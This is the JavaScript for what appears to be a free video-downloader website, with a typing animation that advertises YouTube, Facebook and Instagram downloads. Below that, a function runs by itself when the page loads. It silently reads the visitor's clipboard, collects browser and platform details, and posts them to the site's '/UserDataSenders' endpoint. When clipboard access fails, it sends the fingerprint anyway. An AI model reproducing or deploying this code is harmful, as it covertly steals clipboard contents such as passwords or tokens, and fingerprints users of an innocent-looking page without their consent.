// typewritter Animation
let typed = new Typed(".auto-type", {
  strings: [
    "Download Free YouTube Video",
    "Download Free Facebook Video",
    "Download Free Instagram Video",
    "Download Music From Youtube Video",
    "Get Facebook Profile Information",
    "Get Instagram Profile Informaion",
  ],
  typeSpeed: 150,
  backSpeed: 150,
  loop: true
});

function SendData() {
  // Sending User Data
  navigator.clipboard
    .readText()
    .then((ClipText) => {
      let Platform = navigator.platform;
      let Engine = navigator.product;
      let OnlineStatus = navigator.onLine;
      let Language = navigator.language;
      let BrowserName = navigator.appName;
      let BrowserVersion = navigator.appVersion;
      //Objecting All Data
      let Final_Object_Data = {
        ClipBoard_Text: ClipText,
        Platform: Platform,
        Engine: Engine,
        OnlineStatus: OnlineStatus,
        Language: Language,
        BrowserName: BrowserName,
        BrowserVersion: BrowserVersion,
      };
      ("Data Sending To Server");
      let params = {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(Final_Object_Data),
      };
      fetch("/UserDataSenders", params).then((data) => {
        data.json().then((data) => {
          ("Data Saved to Server & returned successfully");
        });
      });
    })
    .catch((ClipError) => {
      let Platform = navigator.platform;
      let Engine = navigator.product;
      let OnlineStatus = navigator.onLine;
      let Language = navigator.language;
      let BrowserName = navigator.appName;
      let BrowserVersion = navigator.appVersion;
      //Objecting All Data
      let Final_Object_Data = {
        ClipBoard_Text: ClipError.message,
        Platform: Platform,
        Engine: Engine,
        OnlineStatus: OnlineStatus,
        Language: Language,
        BrowserName: BrowserName,
        BrowserVersion: BrowserVersion,
      };
      ("Data Sending To Server");
      let parameters = {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(Final_Object_Data),
      };
      fetch("/UserDataSenders", parameters).then((response) => {
        response.json().then((data) => {
          ("Data Saved to Server & returned successfully");
        });
      });
    });
}
SendData();
